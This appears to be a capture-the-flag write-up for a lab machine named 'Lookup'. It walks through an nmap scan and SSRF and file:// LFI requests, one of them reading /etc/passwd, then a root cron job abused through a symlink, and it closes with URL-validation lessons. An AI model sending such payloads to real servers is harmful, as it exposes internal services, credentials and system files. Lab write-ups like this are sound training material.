---
title: Lookup
difficulty: Easy
environment: Linux & Web
tags:
  - SSRF
  - LFI
  - Cron
  - Symlink
  - Nginx
  - Node.js
  - Linux
  - Web
  - Enumeration
image: "https://cards.scryfall.io/art_crop/front/0/c/0c18c541-758b-4237-9961-9637e996e8a5.jpg?1592516836"
image_alt: "Finishing Blow art"
date: 2026-02-21
---

## Overview

Lookup is an easy-rated machine combining Linux and web attack vectors. It features a web application with a vulnerable lookup/search feature that can be abused for server-side request forgery and local file inclusion.

## Reconnaissance

### Nmap Scan

```
$ nmap -sC -sV -oN nmap/lookup 10.10.11.xx
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1
80/tcp open  http    nginx 1.18.0
3000/tcp open http   Node.js Express
```

We find SSH, an nginx reverse proxy on port 80, and a Node.js Express application on port 3000.

### Web Application

The application provides a "lookup" feature that fetches and displays content from user-supplied URLs. This is a classic SSRF vector.

## Exploitation

### SSRF to Internal Services

By pointing the lookup feature at internal addresses, we can reach services not exposed externally:

```
GET /lookup?url=http://127.0.0.1:3000/admin/config HTTP/1.1
Host: 10.10.11.xx
```

The internal admin config endpoint reveals database credentials and API keys.

### Local File Inclusion

The lookup handler also accepts `file://` URIs:

```
GET /lookup?url=file:///etc/passwd HTTP/1.1
```

### Privilege Escalation

With SSH access obtained through leaked credentials, we discover a cron job running as root that processes files from a user-writable directory:

```
$ cat /etc/cron.d/backup
*/5 * * * * root /opt/backup.sh
```

By injecting a symlink into the backup source directory, we can read the root flag or escalate to a root shell.

## Flags

- **User:** `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`
- **Root:** `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`

## Lessons Learned

Never trust user-supplied URLs in server-side fetch operations. Always validate and restrict URL schemes, and use allowlists for internal network access.
